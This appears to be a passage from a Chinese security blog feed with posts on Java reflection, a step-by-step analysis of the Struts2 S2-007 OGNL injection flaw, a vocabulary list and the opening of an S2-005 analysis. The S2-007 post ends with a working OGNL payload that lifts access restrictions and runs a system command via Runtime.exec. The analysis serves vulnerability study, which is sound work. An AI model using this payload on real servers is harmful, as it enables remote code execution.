src="/2022/02/22/JAVA%E5%B8%B8%E7%94%A8%E7%89%B9%E6%80%A7%E8%AF%A6%E8%A7%A3%E8%AE%B0%E5%BD%95/image-20220226163735224.png" class title="image-20220226163735224"><p>这就是双亲委派的机制</p><h1 id="反射-详细"><a href="#反射-详细" class="headerlink" title="反射(详细)"></a><strong>反射(详细)</strong></h1><p><strong>为什么会产生反射这个需求?</strong></p><p>假设这样一个场景,程序执行过程中需要实例化所有具有toString方法的类,但是这个时候我们并不知道那些类有这个方法,那我们应该怎么办呢?new一个A对象然后去尝试调用?这显然是不太可取而且很麻烦的,这个时候就需要一个第三者监管机制,他好比上帝之眼,能在整个java运行过程中独立出来,置于程序外部去帮我们读取类的各种信息,帮助我们执行程序,这样的机制叫做反射</p><p>我画了个图,整个反射调用原理大概是这个样子的</p><img src="/2022/02/22/JAVA%E5%B8%B8%E7%94%A8%E7%89%B9%E6%80%A7%E8%AF%A6%E8%A7%A3%E8%AE%B0%E5%BD%95/image-20220302161547326.png" class title="image-20220302161547326"><p>结合上面的图我们来看下面这个例子:</p><p>fanshe.java</p><p>先用Class.forName(“demo”)加载,获得了demo的class对象democlass,然后通过这个democlass的getMethod获取到了demo类中的method方法,然后调用无参构造函数实例化obj(getConstructor()获取无参构造函数),然后使用invoke反射调用方法.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">fanshe</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException </span>&#123;</span><br><span class="line">        Class democlass = Class.forName(<span class="string">&quot;demo&quot;</span>);</span><br><span class="line">        Method m = democlass.getMethod(<span class="string">&quot;method&quot;</span>);</span><br><span class="line">        <span class="comment">//getConstructor获取共有无参构造方法</span></span><br><span class="line">        Object obj = democlass.getConstructor().newInstance();</span><br><span class="line">        m.invoke(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>demo.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">demo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String teststring;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">demo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.teststring = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;无参构造方法调用&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;method方法被调用&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">demo</span><span class="params">(String teststring)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.teststring = teststring;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getTeststring</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> teststring;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setTeststring</span><span class="params">(String teststring)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.teststring = teststring;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">无参构造方法调用</span><br><span class="line">method方法被调用</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;作为一个没有进行过JAVA开发的菜鸡,在审计代码的过程中经常会遇到JAVA的一些特性,了解这些特性是必要的.我采用一边学习一边记录的方式,在学习JAVA安全过程中遇到的各种JAVA特性,概念在这里进行统一的学习记录,以方便查看.&lt;/p&gt;
&lt;p&gt;这里我把他们分为两个类型,&lt;s</summary>
      
    
    
    
    
    <category term="JAVA特性" scheme="https://men9da.cn/tags/JAVA%E7%89%B9%E6%80%A7/"/>
    
    <category term="JAVA" scheme="https://men9da.cn/tags/JAVA/"/>
    
  </entry>
  
  <entry>
    <title>Struts2-S007详细分析</title>
    <link href="https://men9da.cn/2022/01/28/Struts2-S007%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/"/>
    <id>https://men9da.cn/2022/01/28/Struts2-S007%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/</id>
    <published>2022-01-28T04:42:59.000Z</published>
    <updated>2022-03-07T11:47:53.369Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h1><p>在分析007的过程中发现007和001有一定的相似程度,但是在搭建环境的时候被网上不少文章给误导了,很明显这些文章并不是很清楚整个漏洞的触发条件以及原理,大部分的文章都会添加一个<code>[ActionName]-validation.xml</code>的验证表单,好像这个东西是整个漏洞触发的必要条件.后来发现这个是vulhub中带的,<strong>大家没有自己搭建环境就直接下载现成环境自然而然也不会去追究为什么会有这么一个东西以及他究竟是不是有必要的</strong>所以自己搭建环境进行复现是非常有必要的</p><h1 id="0X01-环境搭建"><a href="#0X01-环境搭建" class="headerlink" title="0X01:环境搭建"></a>0X01:环境搭建</h1><p>S2-007究竟会在什么样的一个环境下触发,首先就需要直到为什么会造成这个漏洞</p><p>很多文章一开头就说了,这个漏洞发生在类型转换时如果发生错误(比如abcd不能转换为int类型)的时候会将错误保存起来,然后将发生错误的参数传入input视图(struct.xml中配置),input视图如果存在标签解析,而这个标签恰巧是我们的可控数值,这个时候就struct就会默认尝试先去使用ognl解析这个标签的值,如果此时我们的值是一个ognl表达式那么就会被解析了</p><p>所以能够造成此漏洞的需要的必要环境条件是</p><p>1.于存在类型转换错误</p><p>2.配置input视图</p><p>3.input视图需要存在标签解析</p><p>而不是什么[ActionName]-validation.xml</p><p>这里给出核心配置文件内容</p><p>struts.xml:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">struts</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.5//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;http://struts.apache.org/dtds/struts-2.5.dtd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">&quot;struts.devMode&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">&quot;struts.enable.DynamicMethodInvocation&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;myPackage&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">default-action-ref</span> <span class="attr">name</span>=<span class="string">&quot;index&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;index&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.example.HelloWorldAction&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span>&gt;</span>/WEB-INF/jsp/index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;demo&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.example.HelloWorldAction&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>&gt;</span>/welcome.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;input&quot;</span>&gt;</span>/welcome.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>HelloWorldAction.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright 2006 The Apache Software Foundation.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span><br><span class="line"><span class="comment"> * you may not use this file except in compliance with the License.</span></span><br><span class="line"><span class="comment"> * You may obtain a copy of the License at</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *      http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Unless required by applicable law or agreed to in writing, software</span></span><br><span class="line"><span class="comment"> * distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span></span><br><span class="line"><span class="comment"> * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line"><span class="comment"> * See the License for the specific language governing permissions and</span></span><br><span class="line"><span class="comment"> * limitations under the License.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorldAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Integer payload = <span class="keyword">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HelloWorldAction</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPayload</span><span class="params">(Integer payload)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.payload = payload;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">setPayload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.payload;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>index.jsp</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span></span><br><span class="line">         pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">&quot;s&quot;</span> uri=<span class="string">&quot;/struts-tags&quot;</span> %&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;S2-007&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;S2-007 Demo&lt;/h2&gt;</span><br><span class="line"></span><br><span class="line">&lt;s:form action=<span class="string">&quot;demo&quot;</span>&gt;</span><br><span class="line">    &lt;s:textfield name=<span class="string">&quot;payload&quot;</span> label=<span class="string">&quot;payload&quot;</span> /&gt;</span><br><span class="line">    &lt;s:submit&gt;&lt;/s:submit&gt;</span><br><span class="line">&lt;/s:form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>welcome.jsp</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span></span><br><span class="line">         pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">&quot;s&quot;</span> uri=<span class="string">&quot;/struts-tags&quot;</span> %&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;S2-007&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;S2-007 Demo&lt;/h2&gt;</span><br><span class="line"></span><br><span class="line">&lt;s:form action=<span class="string">&quot;demo&quot;</span>&gt;</span><br><span class="line">    &lt;s:textfield name=<span class="string">&quot;payload&quot;</span> label=<span class="string">&quot;payload&quot;</span> /&gt;</span><br><span class="line">    &lt;s:submit&gt;&lt;/s:submit&gt;</span><br><span class="line">&lt;/s:form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h1 id="0X02-报错处理导致的字符串拼接"><a href="#0X02-报错处理导致的字符串拼接" class="headerlink" title="0X02:报错处理导致的字符串拼接"></a>0X02:报错处理导致的字符串拼接</h1><p>可以看到我的HelloWorldAction.java里面定义的payload是int类型的,而我们传入到Action里面的参数默认都是字符串,我传参123,其实是个字符串”123”,但是字符串123是可以被强制类型转换为int类型的,不会报错.但当我们输入的是字符的时候,便会触发报错,而恰巧就是这个地方,造成了漏洞</p><p>验证payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;+(#application)+&#39;</span><br></pre></td></tr></table></figure><p>首先带着我们的payload请求</p><p>我们在xwork.com.opensymphony.xwork2.conversion.impl.XWorkConverter.class中的handleConversionExpection方法处下断点,该方法是处理一个转换异常的句柄</p><img src="/2022/01/28/Struts2-S007%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220128142655991.png" class title="image-20220128142655991"><p>可以看到创建了一个conversionErrors的map并且将造成异常的参数名和参数值存入,</p><p>realProperty=payload</p><p>value=’+(#application)+’</p><p>然后我们就来到了拦截器</p><img src="/2022/01/28/Struts2-S007%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220128142839086.png" class title="image-20220128142839086"><p>将刚刚的conversionErrors取出来,然后进入while循环,if判断此时的propertyName和value是否为空,很明显他们不为空,propertyName是参数名,value是参数值</p><p>然后进入if,将对应的错误信息取出,message和action的值为</p><img src="/2022/01/28/Struts2-S007%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220128143602492.png" class title="image-20220128143602492"><p>然后会进入下面的fakie.put方法</p><img src="/2022/01/28/Struts2-S007%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220128143631831.png" class title="image-20220128143631831"><p>跟进getOverrideExpr</p><img src="/2022/01/28/Struts2-S007%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220128143714782.png" class title="image-20220128143714782"><p>可以发现这里将value压入stake,然后又取出stake的top也就是又把value取出来进行拼接,拼接两个单引号,然后返回</p><p>这个地方就出了大问题了,假设这个地方没有进行字符串拼接,那无论如何我们的stak.findvalue取出来的值都会是一个单独的字符串,但是这个地方进行了拼接,拼接过后的payload就变成了’’+(#application)+’’这是一个可以被ognl解析的表达式,等等会被解析ASTAdd类型,然后执行ognl表达式导致注入</p><p>现在fakie中已经有我们的拼接后的表达式了</p><img src="/2022/01/28/Struts2-S007%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220128151011077.png" class title="image-20220128151011077"><p>接着便会new一个PreResultListener,并且将fakie中的值取出来.</p><p>接着就要重新渲染一次页面了,这个时候会和S2-001一样调用dostarttag,doendtag,S2-001是由于循环解析导致了我们可以直接控制ognl解析内容,而S2-007是由于类型转换出错,现在需要通过input视图输出错误数据,而这个时候错误数据已经不是我们原本输入的错误数据了,而是经过字符串拼接过后的错误数据,而ognl又会解析这个拼接后的错误数据,所以直接执行ognl表达式了</p><p>来到xwork.com.opensymphony.xwork2.ognl.OgnlValueStack的tryFindValue方法</p><img src="/2022/01/28/Struts2-S007%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220128151722939.png" class title="image-20220128151722939"><p>此时expr的值还为payload,现在需要去lookupForOverrides方法查询这个方法的值,跟进</p><img src="/2022/01/28/Struts2-S007%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220128151809513.png" class title="image-20220128151809513"><p>从overrides中查找payload,而之前错误处理的时候已经将拼接过后的字符串传入进去了,所以这个地方会直接获取到</p><img src="/2022/01/28/Struts2-S007%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220128151857572.png" class title="image-20220128151857572"><p>expr为拼接后的恶意payload</p><p>然后直接调用getValue-&gt;ognlUtil.getValue-&gt;Ognl.getValue</p><p>通过ASTAdd拆分为其他的ASTNode,分别调用</p><img src="/2022/01/28/Struts2-S007%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220128152127491.png" class title="image-20220128152127491"><p>之后的过程就是ognl解析AST树的过程了,在对S2-003的文章中有详细介绍过</p><p>完整payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]&#x3D;true ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]&#x3D;new java.lang.Boolean(&quot;false&quot;),@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;calc&#39;).getInputStream())) + &#39;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言:&quot;&gt;&lt;/a&gt;前言:&lt;/h1&gt;&lt;p&gt;在分析007的过程中发现007和001有一定的相似程度,但是在搭建环境的时候被网上不少文章给误导了,很明显这些文章并不是很清楚整个漏洞的</summary>
      
    
    
    
    
    <category term="Java代码审计" scheme="https://men9da.cn/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Struts2" scheme="https://men9da.cn/tags/Struts2/"/>
    
    <category term="JAVA安全" scheme="https://men9da.cn/tags/JAVA%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>常用单词随笔记录</title>
    <link href="https://men9da.cn/2022/01/28/%E5%B8%B8%E7%94%A8%E5%8D%95%E8%AF%8D%E9%9A%8F%E7%AC%94%E8%AE%B0%E5%BD%95/"/>
    <id>https://men9da.cn/2022/01/28/%E5%B8%B8%E7%94%A8%E5%8D%95%E8%AF%8D%E9%9A%8F%E7%AC%94%E8%AE%B0%E5%BD%95/</id>
    <published>2022-01-27T16:38:40.000Z</published>
    <updated>2022-03-16T00:54:19.181Z</updated>
    
    <content type="html"><![CDATA[<p><strong>为什么会有这样一个文章?</strong></p><p>在我们看别人代码的时候,大部分变量名是以英文命名的,虽然我们有翻译软件可以翻译,但是在审计代码的过程中复杂的调用过程都去百度翻译一下是很浪费时间的而且很有可能让本来都不通顺的思维打断,我常常通过变量名,方法名作为理解一个函数作用的重要方法,英语又是我非常烂的一门学科,所以有了这篇文章,这篇文章会一直更新,记录那些常用的单词,并解释他们作为变量名的时候的含义,**并且同时学习代码编写规范,**这样才能更好的看懂别人的代码.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">handle:句柄</span><br><span class="line">Conversion :转换</span><br><span class="line">Exception:异常</span><br><span class="line">property:属性</span><br><span class="line">Intercept:拦截器</span><br><span class="line">invoke:激活,引用</span><br><span class="line">invocation:调用</span><br><span class="line">iterator:迭代器</span><br><span class="line">pre:pre- 开头的函数或者变量名，通常会在程序的核心流程之前发生、进行；</span><br><span class="line">contains:包含</span><br><span class="line">util:工具类会带上,是utiliy的缩写</span><br><span class="line">compile:编译</span><br><span class="line">Malformed:格式错误</span><br><span class="line">sequence:序列</span><br><span class="line">External:外部</span><br><span class="line">Serial:连续的</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;为什么会有这样一个文章?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在我们看别人代码的时候,大部分变量名是以英文命名的,虽然我们有翻译软件可以翻译,但是在审计代码的过程中复杂的调用过程都去百度翻译一下是很浪费时间的而且很有可能让本来都不通顺的思维打断,我常常通过变量名</summary>
      
    
    
    
    
    <category term="常用单词记录" scheme="https://men9da.cn/tags/%E5%B8%B8%E7%94%A8%E5%8D%95%E8%AF%8D%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>Struts2-S2 005详细分析</title>
    <link href="https://men9da.cn/2022/01/27/Struts2-S005%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/"/>
    <id>https://men9da.cn/2022/01/27/Struts2-S005%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/</id>
    <published>2022-01-27T06:08:33.000Z</published>
    <updated>2022-03-07T11:47:49.733Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h1><p><strong>注:如果你跟我一样是个菜鸡并且没有看过S2-003,那么强烈建议去看一下S2-003的调用过程,我也有写,可以先看一下</strong></p><p>昨天刚啃完了struts2-s003,第一次分析觉得超级复杂花费了大量的时间,同时也对整个解析流程熟悉了很多,听说S2-005是S2-003的绕过,不妨趁热打铁,直接分析一下.</p><p><strong>注:以下内容以及思维逻辑站在一个刚开始接触java审计的菜鸡身上,同时也能记录我的思维进步过程</strong></p><p>由于熟悉S2-003的调用过程,当我首次看网上各类文章的时候,分为两种</p><p>第一种:简单介绍一下这个是s2-003的绕过,然后提了一下unicode编码绕过,然后就说官方是通过增加一个沙盒模式进行修复,然后就是下载现成环境打一发payload结束</p><p>第二种:一些大佬们直接从代码层面分析代码的改动,首先新增了几个接口,由xxx实现,解释了一大波新的内容,新增了xxxx方法,这对于我这种开发经验不足且刚接触java审计的菜鸡无疑是毁灭性的打击,<strong>但是,既然是针对S2-003的绕过,那我就饶过这个本质而言,先尝试自己分析为什么旧的payload不能执行了</strong>分析完后没想到并没有这么复杂并且我自己在没有看别人发的payload的情况下也完成了绕过,虽说和原本S2-003的payload差距不大,但是这种分析问题的思路给了我很大的启发.</p><h1 id="0X01-旧的payload为什么不能执行了"><a href="#0X01-旧的payload为什么不能执行了" class="headerlink" title="0X01:旧的payload为什么不能执行了?"></a>0X01:旧的payload为什么不能执行了?</h1><p>修改一下pom.xml,将struts2的版本修改到2.1.8.1</p><p>和S2-003一样的分析步骤,完全相同的调用栈,但是其中多了一些步骤,这些步骤是在调用ognlUtil.setValue之前的,我们暂时不管他干了啥,直接来到触发点ognlUtil.setValue<img src="/2022/01/27/Struts2-S005%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220127150715728.png" class title="image-20220127150715728"></p><p>可以看到此处已经经过了各种拦截器但此时expr仍然是我们可控的**,也就是说,S2-005的更新并没有从参数限制上下手,没有直接屏蔽这些unicode编码的特殊字符**</p><p>继续往下跟进</p><img src="/2022/01/27/Struts2-S005%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220127150921638.png" class title="image-20220127150921638"><p>来到熟悉的setValueBody,此时children[0]已经被解析为正常的ognl表达式,<strong>说明仍然会将unicode编码进行解码</strong></p><p>继续往下跟进来到执行第一个参数的地方</p><img src="/2022/01/27/Struts2-S005%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220127151207567.png" class title="image-20220127151207567"><p>可以看到,children已经被顺利执行了,此时图中所示的context已经被修改为了false,<strong>到这里我们就能确定,我们还是可以通过S2-003的payload对context进行修改</strong></p><p>接下来我们来解析第二个参数,也就是静态方法执行</p><img 